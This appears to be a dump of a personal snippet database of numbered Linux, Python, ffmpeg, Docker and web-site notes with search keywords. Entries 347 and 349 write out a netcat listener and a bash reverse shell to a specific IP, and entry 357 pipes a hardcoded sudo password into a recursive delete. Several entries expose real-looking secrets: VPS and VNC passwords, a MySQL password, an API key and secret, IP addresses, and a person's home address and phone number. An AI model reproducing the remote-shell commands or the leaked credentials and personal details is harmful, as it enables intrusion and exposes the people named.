os.system('mpg321 audio.mp3 -quiet')
text to voice text2voice 
----
id:332
 
/home/jack/Desktop/Ubuntu16.04/notebooks/style_transfer-master/docker/ Docker style_transfer

----
id:333

clear output
from IPython.display import clear_output
from time import sleep
for i in range(10):
    sleep(1)
    clear_output()
    print(i)

----
id:334

git rm --cached giant_file
    # Stage our giant file for removal, but leave it on disk
git commit --amend -CHEAD
    # Amend the previous commit with your change
    # Simply making a new commit won't work, as you need
    # to remove the file from the unpushed history as well
git push
    # Push our rewritten, smaller commit
remove large file update git error

----
id:335

import warnings
warnings.filterwarnings('ignore', message='numpy.dtype size changed')
warnings.filterwarnings('ignore', message='numpy.ufunc size changed')

----
id:336

import pip
pip.main(['install', 'git+https://github.com/jakevdp/JSAnimation'])
from JSAnimation.IPython_display import display_animation, anim_to_html
import a module directly from github import github

----
id:337

codex codecs
https://core-api.github.io/python-client/api-guide/codecs/
https://github.com/core-api/python-client/

----
id:338
 
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias updateAll='sudo updatedb && updatedb -l 0 -o ~/.Orig.db -U /mnt/40ec525c-34bc-44ef-99c8-53f5524ad88b'alias locateAll='locate -d ~/.Orig.db: -i'
alias cd..='cd ..'
alias ned='NED'
alias dock='sudo docker'
alias cdOrig='cd /mnt/40ec525c-34bc-44ef-99c8-53f5524ad88b'
alias ined='/home/TEMP/NED -I '
alias fned='/home/TEMP/NED -DS .'
alias ijav='/home/TEMP/JAVA -I '
alias ilink='/home/TEMP/LINKS -I '
alias INFO='cd /home/jack/Desktop/document-server/SERVER && npm start'
alias universe='conda activate universe-starter-agent && jupyter notebook'
alias UV='conda activate universe-starter-agent'
# Add an alert alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send 
----
id:339

docker compose docker-compose
 ln -s /media/jack/40ec525c-34bc-44ef-99c8-53f5524ad88b/home/jack/anaconda2/envs/universe/bin/docker-compose /media/jack/40ec525c-34bc-44ef-99c8-53f5524ad88b/home/jack/anaconda2/bin/docker-compose

----
id:340

RUN DEBIAN_FRONTEND=noninteractive apt-get install -yq 
non interactive dockerfile start Dockerfile start

----
id:341

RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt install -yq 
keywords non interactive dockerfile start Dockerfile start

----
id:342

resources resource text 
https://arxiv.org/

----
id:343

To add libraries to path:
sudo gedit /etc/ld.so.conf.d/randomLibs.conf
inside the file the complete path to the directory that contains libraries 
needed to add to the system. Example:
/opt/ros/melodic/lib
Add only the path to the dir, not the full path for the file.
The libs inside that path will be automatically indexed.
Save the file and run sudo ldconfig to update the system with this libs.

----
id:344
rsync -chavzP --stats /home/jack/Desktop/video-resources/image-maniplation-javascript/fishkis/Christmas jack@192.250.236.207:/home/jack
transfer directory, vps transfer, rsync sync VPS vps 

----
id:345

# 1. redo last command but as root
sudo ned -I 
----
id:346

/home/jack/hidden/bash-commands.txt
bash commands 
nano /home/jack/hidden/bash-commands.txt

----
id:347

nc -lp 1337
on the remote:
bash -i>& /dev/tcp/homeip/1337 0>&1
remote connect

----
id:348

jack@NS1:~$ jack@192.250.236.207 ThinkT2524collage VPS vps
[jack@server1 ~]$ jack@162.208.10.253 ThinkPadT2524collage VPS vps
vps password, VPS password

----
id:349

Local Computer command listen on local computer port:
nc -lp 1337
----------
Remote Computer tunnel shell to port 1337 on local computer:
bash -i >& /dev/tcp/162.208.10.253/1337 0>&1
pipe tunnel piping tunneling VPS vps 
----
id:350

# -*- coding: utf-8 -*- 
'\xc2' in file /home/jack/gym/gym/envs/classic_control/cartpole.py on line 27, but no encoding declared ;

----
id:351

ADD add cpath CPATH For the current session you can
export LD_LIBRARY_PATH=/lib:/usr/lib:/usr/local/lib
to make the change permanent you can add /usr/local/lib 
to /etc/ld.so.conf (or something it includes) and run ldconfig as root.
If you're still having problems, running ldd [executable name] 
will show you the libraries it's trying to find, and which ones can't be found.

----
id:352

find module location, terminal locate module
python -c "import os; import spacy; print(os.path.dirname(spacy.__file__))"

----
id:353

mknod /dev/tty0 c 4 0
root@4de0414d562c:/app# chmod 640 /dev/tty0
dont understand 

----
id:354

get size of an npm file 
download-size module-size

----
id:355

Retrieving speedtest.net configuration...
Testing from Philippine Long Distance Telephone (112.211.111.138)...
Retrieving speedtest.net server list...
Selecting best server based on ping...
Hosted by PLDT (Makati) [0.65 km]: 7.626 ms
Testing download speed........
Download: 0.87 Mbit/s
Testing upload speed.......
Upload: 1.04 Mbit/s

----
id:356

sudo QT_X11_NO_MITSHM=1 /usr/bin/unetbootin   
----
id:357

# %load scripts/passWord.py
def getpass():
    Pass_key = 'AbcOpenME2423'
    Getpass = (Pass_key)
    return Getpass
#FUNCTIONING
from scripts import passWord
import os
password = passWord.getpass()
#can be any command but don't forget -S as it enables input from stdin
print os.system('echo '+password+' | sudo -S rm -R /root/TEST')

----
id:358

Quoting from the cited page:

«Do the following things.

Backup the file /etc/modules

sudo cp /etc/modules /etc/modules.bak

Add one line to /etc/modules

gksu gedit /etc/modules or sudo vi /etc/modules

3.Tag this on to the end of the file in a new line:

tifm_sd
When you restart, you’re card reader will be functional. You’ll see that when you slap an SD card into the reader, it will automount.

But wait, don’t want to have to restart your machine? Go back to the terminal you impatient person and type:

sudo modprobe tifm_sd
That's all. After a restart, my laptop recognized the inserted SD card and opened the SD card in 

----
id:360

sudo find / -type f -printf "%s\t%p
" | sort -n | tail -1 
find largest files large files   
----
id:361

sudo gedit /etc/fstab  # Open fstab to change the UUID of swap to the same value.
sudo update-initramfs -uk all  
sudo swapon -a    # Restore swap with new fstab settings
free -m   # Check swap

----
id:362

list packages 
grep-aptavail -s Package -F Source ffmpeg | grep -- '-dev$'
grep-aptavail -s Package -F Source ffmpeg

----
id:363

/usr/local/bin/fpeg-start
/usr/local/bin/fpeg
ffmpeg docker

----
id:364

ipython profile create jack
[ProfileCreate] Generating default config file: 
/home/jack/.ipython/profile_jack/ipython_config.py
/home/jack/.ipython/profile_jack/ipython_kernel_config.py
jupyter notebook configure config configuration
jupyter configure jupyter config jupyter configuration

----
id:365

gnome-session-properties - system startup
start applications auto start auto-start

----
id:366

https://pypi.org/project/twitter-photos/
twphotos -u wired
or just twphotos for your account
twitter image download

----
id:367

set FREI0R_PATH=/usr/lib/frei0r-1

----
id:368

/home/jack/Desktop/video-resources/junk/NEW-VIDS/FFMPEG/full-list-commands.txt
full list ffmpeg commands

----
id:369

address jill 15141 Shoshone Drive Corpus Christi, Texas, 78410 United States phone jack phone (479) 715-0734

----
id:370

service ssh status
service ssh start
/etc/ssh/sshd_config
SSH will fail to start if there are syntax errors in:
/etc/ssh/sshd configuration file. 
The following command will tell you if any directives are incorrect:
/usr/sbin/sshd -T
If the configuration test does not return any errors, 
start sshd in debugging mode, it will provide you with a detailed startup
of the service:
/usr/sbin/sshd -ddd

----
id:372

for file in *.png
do
   date=$(date +%Y%m%d)
   basename=${file%.*}    # Remove extension
   extension=${file##*.}  # Remove basename
   ffmpeg -i $file -vf scale=720:-1 -y TEMP.jpg
   ffmpeg -i TEMP.jpg -vf  "crop=720:720:0:0" -y "$basename"_"$date.$extension"

done

----
id:373

taskset --help 
Usage: taskset [options] [mask | cpu-list] [pid|cmd [args...]]
Show or change the CPU affinity of a process.
Options:
 -a, --all-tasks         operate on all the tasks (threads) for a given pid
 -p, --pid               operate on existing given pid
 -c, --cpu-list          display and specify cpus in list format
 -h, --help              display this help
 -V, --version           display version
The default behavior is to run a new command:
    taskset 03 sshd -b 1024
You can retrieve the mask of an existing task:
    taskset -p 700
Or set it:
    taskset -p 03 700
List format uses a comma-separated list instead of a mask:
    taskset -pc 0,3,7-11 700
Ranges in list format can take a stride argument:
    e.g. 0-31:2 is equivalent to mask 0x55555555
For more details see taskset(1).
run on one cpu, control cpu

----
id:374

You can install it using sudo dpkg -i /path/to/deb/file followed by sudo apt-get install -f .
You can install it using sudo apt install ./name.deb (or sudo apt install /path/to/package/name.deb ). ...
install deb file, install deb package
install a deb file, install a deb package

----
id:375

https://askubuntu.com/questions/177192/how-do-i-create-a-32-bit-wine-prefix
WINEARCH=win32 WINEPREFIX=~/.wine winecfg

----
id:376

add minicanda to bashrc
export PATH=/home/jack/miniconda3/bin:/home/jack/home/jack/.local/bin:/usr/local/bin:/usr/bin:/opt/ros/melodic/bin:/home/jack/.mujoco/mjpro150/bin:/home/jack/.mujoco/mjpro131/bin:/usr/lib/frei0r-1:/home/jack/torch/install/bin:/home/jack/cling/bin:/usr/include/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/home/jack/glog-0.3.3/src/glog:/home/jack/glog-0.3.3/src:/home/jack/.local/bin:/usr/local/bin:/usr/bin:/home/jack/miniconda3/bin:/home/jack/.mujoco/mjpro150/bin:/home/jack/.mujoco/mjpro131/bin:/home/jack/torch/install/bin:/home/jack/.local/bin:/home/jack/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/bin:/home/jack/.local/bin:/home/jack/torch/install/bin

----
id:377

filename /usr/local/lib/node_modules/zeromq/lib/index.js
var EventEmitter = require('events').EventEmitter
  , zmq = require('/usr/local/lib/node_modules/ijs/node_modules/zmq/build/Release/zmq.node')
  , util = require('util');

----
id:378

/dev/scd0     /media/cdrom0    udf,cdfs,iso9660   user,auto,exec,utf8   0   0 
sudo nano /etc/fstab
jack@jack-desktop:~$ sudo ls /dev/sr*
/dev/sr0
jack@jack-desktop:~$ sudo lshw -C disk
  *-disk                    
       description: ATA Disk
       product: Hitachi HDS72105
       vendor: Hitachi
       physical id: 0.0.0
       bus info: scsi@4:0.0.0
       logical name: /dev/sda
       version: A650
       serial: MS43325T026ZGA
       size: 465GiB (500GB)
       capabilities: gpt-1.00 partitioned partitioned:gpt
       configuration: ansiversion=5 guid=5827156f-4d53-4ef6-bb03-6b7cac28dc53 logicalsectorsize=512 sectorsize=4096
  *-cdrom
       description: DVD-RAM writer
       product: CDDVDW SH-224BB
       vendor: TSSTcorp
       physical id: 0.0.0
       bus info: scsi@5:0.0.0
       logical name: /dev/cdrom
       logical name: /dev/cdrw
       logical name: /dev/dvd
       logical name: /dev/dvdrw
       logical name: /dev/sr0
       version: SB00
       capabilities: removable audio cd-r cd-rw dvd dvd-r dvd-ram
       configuration: ansiversion=5 status=nodisc
automount cdrom mount cdrom 

----
id:379

mount thumbdrive mount USB 
sudo mount /dev/sdb1 /media/USB

----
id:380

To detect your USB device, in a terminal, you can try:

    lsusb , example: ...
    or this powerful tool, lsinput , ...
    udevadm , with this command line, you need to unplug the device before using the command and then plug it to see it:

----
id:381

headset mic 
/dev/input/event2
   bustype : BUS_USB
   vendor  : 0x46d
   product : 0xa38
   version : 273
   name    : "Logitech Inc. Logitech USB Heads"
   phys    : "usb-0000:00:13.0-1/input3"
   uniq    : ""
   bits ev : (null) (null) (null) (null)
----
id:382

hardware info USB cameras headset 
https://www.binarytides.com/linux-commands-hardware-info/

----
id:383
To record from mic - record-mic
----
id:384

https://www.youtube.com/channel/UC7Zn35OgSa9qMVxD4KjtUiA 
MyLinuxToyBox

----
id:385
ffmpeg -loop 1 -i FFMPEG-Join-Multiple-Videos-Fade-Captions-Sound.png -vf "crop=h=720:w=iw:x=0:y='(ih-720)*t/350'" -r 25 -pix_fmt yuv420p -t 240 -y /home/jack/Desktop/MyLinuxToyBox/images/FFMPEG-Join-Multiple-Videos-Fade-Captions-Sound.mkv
----
id:386

-------------------------------
\#\!/bin/sh
set -eu

snap list --all | awk '/disabled/{print $1, $3}' |
    while read snapname revision; do
        snap remove "$snapname" --revision=""
    done
----------- remove snap --------------------
to remove a snap:
sudo snap remove lsd

----
id:387

Add new cron job to crontab:
crontab –e
This opens vi editor for you. Create the cron command using the following syntax:
1. The number of minutes after the hour (0 to 59)
2. The hour in military time (24 hour) format (0 to 23)
3. The day of the month (1 to 31)
4. The month (1 to 12)
5. The day of the week(0 or 7 is Sun, or use name)
6. The command to run
More graphically they would look like this:
* * * * * Command to be executed
- - - - -
| | | | |
| | | | +----- Day of week (0-7)
| | | +------- Month (1 - 12)
| | +--------- Day of month (1 - 31)
| +----------- Hour (0 - 23)
+------------- Min (0 - 59)
An example command would be “0 0 * * * /etc/cron.daily/script.sh”. This
would mean that the shell script will exactly execute at midnight every
night.

----
id:388

sudo dpkg-reconfigure keyboard-configuration
keyboard configure

----
id:389

/etc/default/keyboard
XKBOPTIONS="numpad:microsoft"

----
id:390

xset led on
gsettings set org.gnome.desktop.a11y.keyboard mousekeys-enable true
gsettings set org.gnome.desktop.a11y.keyboard mousekeys-enable false
mouse keys numeric keypad

----
id:391

jacknorthrup.com
UA-117499764-1
Google Analytics
Google ID
google id anylytics

----
id:392

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-136346518-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-136346518-1');
</script>

----
id:393
systemctl list-unit-files | grep enabled
services running

----
id:394

hostnamectl
cat /etc/*-release
lsb_release -a
cat /proc/version

----
id:395

my ip
112.206.151.126
March 17, 2019
----
id:396

centos 7 
sudo chattr -i /usr/lib/udev/rules.d/60-net.rules
fix   Updating   : initscripts-9.49.46-1.el7.x86_64                                                                                                  1/2 
Error unpacking rpm package initscripts-9.49.46-1.el7.x86_64
warning: /etc/sysconfig/readonly-root created as /etc/sysconfig/readonly-root.rpmnew
warning: /etc/sysctl.conf created as /etc/sysctl.conf.rpmnew
error: unpacking of archive failed on file /usr/lib/udev/rules.d/60-net.rules: cpio: rename
  Verifying  : initscripts-9.49.46-1.el7.x86_64                                                                                                  1/2 
initscripts-9.49.24-1.el7.x86_64 was supposed to be removed but is not
----
id:398

IP: 192.243.107.58
Port: 6602
Password: 11O1qG5JOeRj 
jupyternotebook.science 
vcn 
----
id:399

ssh-copy-id -i ~/.ssh/mykey user@host or
ssh-copy-id jack@162.208.10.253
server1.jupyternotebook.science
Main IP Address 162.208.10.253
jack@162.208.10.253 ThinkPadT2524collage
Virtualization: kvm
Operating System: CentOS Linux 7 (Core)
CPE OS Name: cpe:/o:centos:centos:7
Kernel: Linux 3.10.0-229.el7.x86_64
Architecture: x86-64


----
id:400

jack@jack-desktop:~/Desktop/MyLinuxToyBox/mylinuxtoybox.com$ toybox
Enter passphrase for key '/home/jack/.ssh/id_ed25519': 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 2.6.32-042stab133.2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sun Mar 17 23:07:12 2019 from 112.206.151.126
root@ns1:~# 


----
id:403
ffmpeg -i oldvid.mp4 newvid.mkv
----
id:404

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-8172457580576870",
          enable_page_level_ads: true
     });
</script>
 add ads to jack northrup .com

----
id:405

<a href="http://s01.flagcounter.com/more/0v"><img src="https://s01.flagcounter.com/count2/0v/bg_E8E8E8/txt_000000/border_CCCCCC/columns_8/maxflags_250/viewers_0/labels_0/pageviews_0/flags_0/percent_0/" alt="Flag Counter" border="0"></a>
wesite counter flag counter 
----
id:406

grep -nr 'yourString*' . 
find a string in a directory 
----
id:407

arecord --list-devices
find headset, find devices, sound card, locate device 
----
id:408

grep (Global Regular Expression Print)

----
id:409
grep -r "trim=" ./
find using grep how to use grep 

----
id:410

echo 'export PATH=/usr/local/bin:/home/jack/.local/bin:/usr/local/bin:/usr/bin:/opt/ros/melodic/bin:/home/jack/.mujoco/mjpro150/bin:/home/jack/.mujoco/mjpro131/bin:/usr/lib/frei0r-1:/home/jack/torch/install/bin:/home/jack/cling/bin:/usr/include/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/home/jack/glog-0.3.3/src/glog:/home/jack/glog-0.3.3/src:/home/jack/.local/bin:/usr/local/bin:/usr/bin:/home/jack/.mujoco/mjpro150/bin:/home/jack/.mujoco/mjpro131/bin:/home/jack/torch/install/bin:/home/jack/.local/bin:/home/jack/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/home/jack/go/bin:/usr/local/games:/snap/bin:/home/jack/.local/bin:/home/jack/torch/install/bin' >>~/.bash_profile
add a path add path to bashrc  
----
id:411
grep -s "christine" *
search a directory grep search for word

----
id:412
grep -s "christine" *
search a directory grep search for word

----
id:413
for f in *:*; do mv -v "" ""; done
replace characters in name filename rename files 
replace a character in filename 
----
id:414

jack@jack-desktop:~/Desktop$ tracker reset --hard
CAUTION: This process may irreversibly delete data.
Although most content indexed by Tracker can be safely reindexed, it can’t be assured that this is the case for all data. Be aware that you may be incurring in a data loss situation, proceed at your own risk.

Are you sure you want to proceed? [y|N]: y
Found 4 PIDs…
  Killed process 2702 — 'tracker-store'
  Killed process 2730 — 'tracker-miner-fs'
  Killed process 2805 — 'tracker-extract'
  Killed process 2813 — 'tracker-miner-apps'
Setting database locations
Checking database directories exist
Checking database version
Checking whether database files exist
Removing all database/storage files
  Removing database:'/home/jack/.cache/tracker/meta.db'
  Removing db-locale file:'/home/jack/.cache/tracker/db-locale.txt'
  Removing journal:'/home/jack/.local/share/tracker/data/tracker-store.journal'
  Removing db-version file:'/home/jack/.cache/tracker/db-version.txt'

----
id:416
for f in *-*; do mv "$f" "${f//-/_}"; done
replace character clean filenames replace - with _ replace dash
replace character 
----
id:417

from PIL import Image
size = (1040, 1040)
data = '/home/jack/Desktop/Images/mixed-Images/01a.jpg'
image = Image.open(data)
image.thumbnail(size, Image.ANTIALIAS)
background = Image.new('RGBA', size, (255, 255, 255, 0))
background.paste(
    image, (int((size[0] - image.size[0]) / 2), int((size[1] - image.size[1]) / 2))
)
#background.save('output.png')
background.show()
resize image keep aspect transparent back

----
id:418

from PIL import Image
def mktrans(filein,fileout):
    img = Image.open(filein)
    img = img.convert('RGBA')
    datas = img.getdata()
    newData = []
    for item in datas:
        if item[0] == 255 and item[1] == 255 and item[2] == 255:
            newData.append((255, 255, 255, 0))
        else:
            newData.append(item)

    img.putdata(newData)
    img.save(fileout, 'PNG')
    
filein = '/home/jack/Desktop/Images/1040x2seg/5220190416-081926_1a.png'
fileout = '/home/jack/Desktop/Images/1040x2seg/5220190416-081926_1t.png'
mktrans(filein,fileout)
make white transparent transparent white white background transparent background

----
id:421

while True:        
    cv2.imshow('Image', imageResult)        
    if cv2.waitKey(33) == ord('q'):
        cv2.destroyWindow('Image')
        break
close cv2 close window close cv2 window destroywindow
when multiple windows are open destroyWindow('Image')
will shut window Image only.
destroyAllWindows() will close all 

----
id:422

def sho(IMG):
    height, width = IMG.shape[:2]
    print height, width
get image size numpy cv2

----
id:424

<iframe width='560' height='315' src='https://www.youtube.com/embed/XgAOXnGj1bs' 
frameborder='0' allow='accelerometer; autoplay; encrypted-media; gyroscope; 
picture-in-picture' allowfullscreen></iframe>
youtube embed embed youtube YouTube

----
id:425

ffmpeg version N-92507-g027f032-0ubuntu0.16.04.1 Copyright (c) 2000-2018 the FFmpeg developers
/usr/bin/ffmpeg
--------------------------------
FFmpeg -version
ffmpeg version 3.4.4-0ubuntu0.18.04.1 Copyright (c) 2000-2018 the FFmpeg developers
/usr/local/bin/FFmpeg
--------------------------------
FFmpeg may be the better version best version ffmpeg
best ffmpeg FFmpeg

----
id:427

Local Backup
sudo rsync -azvv /home/path/folder1/ /home/path/folder2
Backup Over Network
sudo rsync --dry-run --delete -azvv -e ssh /home/path/folder1/ remoteuser@remotehost.remotedomain:/home/path/folder2
https://help.ubuntu.com/community/rsync

----
id:428

no desktop no icons no right click
xfdesktop 

----
id:433

docker run -ti --rm \ 
-e DISPLAY=:0.0 \
-v /tmp/.X11-unix:/tmp/.X11-unix \
jacknorthrup/x11 
may have to run: 
xhost +local:root 
to give permission for x11

----
id:434

#mkdir rootfs
#sudo mount -o loop slax-64bit-9.8.0.iso rootfs
#mkdir unsquashfs
#sudo unsquashfs -f -d unsquashfs/ rootfs/slax/boot/filesystem.squashfs
#sudo tar -C unsquahsfs  -c . | docker import – jacknorthrup/slax

#sudo tar -C rootfs -c . | docker import - jacknorthrup/slax
#docker run -ti -v /mnt/40ec525c-34bc-44ef-99c8-53f5524ad88b/INSTAGRAM/photos:/var jacknorthrup/slax /bin/bash

mkdir /tmp/iso-mount
sudo mount -o loop,ro slax-64bit-9.8.0.iso /tmp/iso-mount
sudo tar -C /tmp/iso-mount -c . | docker import - jacknorthrup/slax:v1


docker run -ti --rm 
-e DISPLAY=:0.0 
-v /tmp/.X11-unix:/tmp/.X11-unix 
jacknorthrup/x11
FAIL feren-os slax fail

----
id:435
/mnt/40ec525c-34bc-44ef-99c8-53f5524ad88b/home/jack/Desktop/JupyterNotebook-ChatnEditor/
chat chatbot chat edit ChatnEdit 
----
id:436

/home/jack/Desktop/HDD2/video-resources/video-resources/togif/
gif dance Magga Braco  latina-dance latina 
----
id:437

empty trash trash permissions trash 
/usr/local/bin/emptytrash

----
id:439

https://www.youtube.com/watch?v=ACpbALaSSm8
link to me from subscriber 
Thomas The Texas Fam

----
id:440
lsof /dev/snd/*
----
id:441

 PEANUT CHOPSTICK CHALLENGE with HUBBY LOVE
> https://www.youtube.com/watch?v=gVKFYTdM6Ec
> 
> 
> https://www.youtube.com/watch?v=QFarVoyYZEI
> snake
> 
> 
> LITTLE GIRL WAS TELLING A GHOST STORY AND ENDS IN A FUNNY WAY
> Cute story ha ha Thw itch had no wings but the princess had wings ha ha Kenzy Mask https://www.youtube.com/watch?v=Yk8SJo5jDn8
> https://www.youtube.com/channel/UCoD7r32trneMKAgjjjL1N1w
> https://www.youtube.com/channel/UChj1nOPpCrACrNiYLJeHwyw
> https://www.youtube.com/channel/UCyf1Hgq5giheAl7zqtyCM2w
> https://www.youtube.com/watch?v=j24wzxwK2zM
----
id:442
lsof /dev/snd/*
Device busy rsource busy audio

----
id:443

wget -q -O /tmp/libpng12.deb http://mirrors.kernel.org/ubuntu/pool/main/libp/libpng/libpng12-0_1.2.54-1ubuntu1_amd64.deb   && dpkg -i /tmp/libpng12.deb   && rm /tmp/libpng12.deb

----
id:444
apt list --upgradable
upgrade upgradable 
----
id:445

<script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
</script>
</head>
<amp-auto-ads type="adsense"
              data-ad-client="ca-pub-8172457580576870">
</amp-auto-ads>

----
id:446

Denny Thomas hotel - Jackson Thew Shovel
----
id:447

Denny Thomas hotel - Jackson Thew Shovel 
Denny Thomas, manager of the Americana Inn in Elyria 
----
id:448

import os
import shutil 
import os.path
for dirpath, dirnames, filenames in os.walk('/home/jack/fonts'):
    for filename in [f for f in filenames if f.endswith('.ttf')]:
        Path = os.path.join(dirpath, filename)
        shutil.copy(Path, '/home/jack/font-bak') 
copy files by extension to another directory
copy directory 
----
id:449
grep -iRl 'elastic.v6@v6' ./  .. find text in a file  
----
id:450
find . -printf '%T@ %t %p
' | sort -k 1 -n | cut -d' ' -f2-
----
id:451
find . -printf '%T@ %t %p
' | sort -k 1 -n | cut -d' ' -f2-
list files recursively by date
----
id:452

remove spaces from filenames detox ~/

----
id:453
ffmpeg -f alsa -i plughw:CARD=H3100,DEV=0 -acodec libmp3lame -t 10 01-01-20.mp3
save a file by date filename datename 
----
id:454
 milisecond 01012019660879633

----
id:455
wget https://github.com/gyurisc/icsharp.kernel/releases/download/v1.0-beta/icsharp_kernel_v1.0.zip
icsharp.exe run with 
mono icsharp.exe to install C# jupyternotebook  
----
id:456

grep -rn "string" *  find a word find word 
----
id:458
find /mnt/40ec525c-34bc-44ef-99c8-53f5524ad88b/home/vids -type f ! -name "*.*" -exec cp '{}' "/home/jack/Desktop/SCRIPTS" ";"
find and copy files without extension 
----
id:459

import sqlite3
def dbinfo(database):
    conn = sqlite3.connect(database)
    conn.text_factory = str
    c = conn.cursor()
    res = c.execute("SELECT name FROM sqlite_master WHERE type='table';")
    row = c.fetchone()
    row = str(row)
    row = row.replace("(","");row = row.replace(",)","")
    row = row.replace("'","")
    print row
    cur = c.execute("select * from '%s'" %  row)
    columns = [description[0] for description in cur.description]
    return columns

# if run directly
database=/home/jack/.local/share/lbry/lbrynet/lbrynet.sqlite
dbinfo(database)

get info on unknown database  unknown sqlite 

----
id:460
sudo /etc/init.d/elasticsearch start
----
id:461

Command 'java' not found, but can be installed with:

apt install default-jre
apt install openjdk-11-jre-headless
apt install openjdk-8-jre-headless
apt install openjdk-9-jre-headless
java version java8 java11 
----
id:462

resize windows snap
gsettings set org.gnome.mutter edge-tiling false
gsettings set org.gnome.shell.overrides edge-tiling false

----
id:463

date +%s 

----
id:464

nohup conky >/dev/null & 
run script and keep active after window is closed  
----
id:465

CREATE USER 'jack'@'localhost' IDENTIFIED BY 'ThinkPadT0';
create user mysql 
----
id:466

mysql privileges 
GRANT ALL PRIVILEGES ON *.* TO 'jack'@'localhost';
to grant only one database replace *.* with DatabaseName.*
or DatabaseName.Table togrant permissions to one table.

----
id:467

pip install --user jupyter_contrib_nbextensions
jupyter contrib nbextension install --user --skip-running-check
pip install --user jupyter_nbextensions_configurator
jupyter nbextensions_configurator enable --user

----
id:468
git remote set-url origin git@github.com:JupyterJones/Nodejs_Tips_Scripts.git
git push set remote start git
----
id:469
~/Desktop && docker images > docker-images.txt && sed 's/ \+ /\t/g' docker-images.txt >DockerImages.txt && cat DockerImages.txt
----
id:470

scp /home/jack/Desktop/JupyterNotebooks-languages/images/BGI-056.jpg jack@192.243.108.78:/var/www/lbry-toolbox.com/public/images
cp toolbox lbry-toolbox thumbnails

----
id:471

www file permissions 
chown -R jack /var/www/my-website.com/
chgrp -R www-data /var/www/my-website.com/
chmod -R 750 /var/www/my-website.com/
chmod g+s /var/www/my-website.com/
chmod g+w /var/www/my-website.com/<writable-folder>

----
id:472
sudo sub /usr/share/themes/Ambiance/gtk-2.0/gtkrc
scrollbar
----
id:473
grep -s "node" * .*
----
id:474

https://www.npmjs.com/package/async-require 
----
id:475
sudo du -a /dir/ | sort -n -r | head -n 20
largest files largest n amount 
----
id:476
sudo du -a /dir/ | sort -n -r | head -n 20
largest files largest n amount 
sudo du -a / 2>/dev/null | sort -n -r | head -n 20
----
id:477

https://www.cyberciti.biz/open-source/30-cool-best-open-source-softwares-of-2013/
----
id:478
sudo find / -type f -printf '%s\t%p
' | sort -n | tail -1
sudo du -a /home 2>/dev/null | sort -n -r | head -n 40
sudo find /home/jack -type f -printf '%s\t%p
' | sort -n | tail -30

----
id:479

API Key:00340afb8e8a66ebc7ca
API Secret:fca30d62ef17be8bf3626686c6ad4290c5ca6c94
Application Website:https://lbry-toolbox.com
Callback URL:https://lbry-toolbox.com/callback/dailymotion
Short description:upload videos to daily motion
Purpose:upload videos to daily motion


----
id:480

$ pactl list short sinks
>>0alsa_output.usb-Logitech_Inc._Logitech_USB_Headset_H340-00.analog-stereomodule-alsa-card.cs16le 2ch 44100HzRUNNING
>>1alsa_output.pci-0000_00_14.2.iec958-stereomodule-alsa-card.cs16le 2ch 44100HzIDLE
$ pactl list short sources
>>0alsa_output.usb-Logitech_Inc._Logitech_USB_Headset_H340-00.analog-stereo.monitormodule-alsa-card.cs16le 2ch 44100HzRUNNING
1alsa_output.pci-0000_00_14.2.iec958-stereo.monitormodule-alsa-card.cs16le 2ch 44100HzRUNNING
2alsa_input.pci-0000_00_14.2.analog-stereomodule-alsa-card.cs16le 2ch 44100HzRUNNING
$ pactl set-default-source 'alsa_output.usb-Logitech_Inc._Logitech_USB_Headset_H340-00.analog-stereo.monitor'
 sound default 
----
id:481

alias ffmpeg='taskset --cpu-list 1 ffmpeg -hide_banner' 
run ffmpeg run process one cpu 
----
id:482
To see a list the files of the package with dpkg -L packagename, you will also see what's in the /usr/share/doc/ directory.
----
id:483
wget --wait=2 --level=inf --limit-rate=20K --recursive --page-requisites --user-agent=Mozilla --no-parent --convert-links --adjust-extension --no-clobber -e robots=off https://example.comget a whole website download website 
----
id:484

>>> mylist = ['123','123456','1234']
>>> print max(mylist, key=len)
123456 find longest element in a list
----
id:485
mv /home/jack/miniconda3/lib/python3.7/site-packages/dateutil /home/jack/miniconda3/lib/python3.7/site-packages/Xdateutil
----
id:486

https://linuxtot.com/installing-perl-6-on-debian-or-ubuntu/
perl6 install perl6 
----
id:487

sudo update-alternatives --config java
sudo update-alternatives --config javac
change java also set java home
export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64
in ~/.bashrc 
----
id:488
sudo update-alternatives --config x-terminal-emulator
set default terminal terminator

----
id:489
remove multiple characters
>>> import string
>>> vowels = 'aeiou'
>>> remove_vowels = string.maketrans(vowels, ' ' * len(vowels))
>>> 'test translation'.translate(remove_vowels)
't st tr nsl t  n' 
----
id:490
 xrandr --output VGA-0 --brightness 0.7
screen control brightness screen brightness

----
id:491
ogr2ogr 
gdal-bin/bionic 2.2.3+dfsg-2 amd64
  Geospatial Data Abstraction Library - Utility programs
python-stetl/bionic,bionic 1.1+ds-2 all
  Streaming ETL - Geospatial ETL framework for Python 2
stetl/bionic,bionic 1.1+ds-2 all
  Streaming ETL - Commandline utility

----
id:492
 sub /etc/xdg/tumbler/tumbler.rc
tumblerd thumnail manager
----
id:493

Use the map function (in Python 2.x):
results = map(int, results)
In Python 3, you will need to convert the result from map to a list:
results = list(map(int, results))
string2integers string 2 integers list string list integers

----
id:495

https://console.cloud.google.com/apis/credentials?_ga=2.225474652.731643501.1589854651-1918270244.1589854651&pli=1&project=youtube-data-apiv3-243400&folder=&organizationId=
----
